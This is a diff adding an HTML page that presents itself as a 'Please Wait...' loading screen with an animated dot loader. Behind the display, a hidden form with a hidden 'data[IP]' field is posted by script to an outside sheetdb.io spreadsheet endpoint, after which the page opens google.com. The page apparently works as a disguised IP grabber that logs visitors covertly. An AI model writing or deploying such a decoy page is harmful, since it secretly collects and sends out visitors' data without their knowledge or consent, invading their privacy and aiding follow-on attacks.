@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+
+</head>
+<body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <script src="main.js"></script>
+    <center>
+    <h1>Please Wait...</h1>
+    </center>
+
+    <form action="https://sheetdb.io/api/v1/5bzsfqu5suoih" method="POST" id="sheetdb-form" class="form-container">
+        <textarea style="display: none;" name="data[IP]" id="ip" cols="30" rows="10"></textarea>
+
+
+        <button type="submit" id="submit" style="display: none"></button>
+        
+        <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => 
+          {
+            
+            window.open('https://google.com');
+
+          });
+        });
+        </script>
+
+
+    </form>
+    
+
+
+
+
+
+    <style>
+        
+        
+       .loader{
+         position: absolute;
+         top: 50%;
+         left: 50%;
+         transform: translate(-50%, -50%);
+         display: flex;
+         align-items: center;
+           
+       }
+       /* Creating the dots */
+       span{
+         margin-top: 70px;
+         height: 20px;
+         width: 20px;
+         margin-right: 10px;
+         border-radius: 50%;
+         background-color: rgb(255, 255, 255);
+         animation: loading 1s linear infinite;
+         opacity: 0.75;
+       }
+       /* Creating the loading animation*/
+       @keyframes loading {
+         0%{
+          transform: translateX(0);
+         }
+         25%{
+          transform: translateX(15px);
+         }
+         50%{
+          transform: translateX(-15px);
+         }
+         100%{
+          transform: translateX(0);
+         }
+           
+       }
+      span:nth-child(1){
+        animation-delay: 0.1s;
+      }
+      span:nth-child(2){
+        animation-delay: 0.2s;
+      }
+      span:nth-child(3){
+        animation-delay: 0.3s;
+      }
+      span:nth-child(4){
+        animation-delay: 0.4s;
+      }
+      span:nth-child(5){
+        animation-delay: 0.5s;
+      }
+      </style>
+
+
+
+    <div class="loader">
+        <span></span>
+        <span ></span>
+        <span ></span>
+        <!-- <span ></span> -->
+        <!-- <span></span> -->
+        <!-- <span></span> -->
+      </div>
+
+
+</body>
+</html>
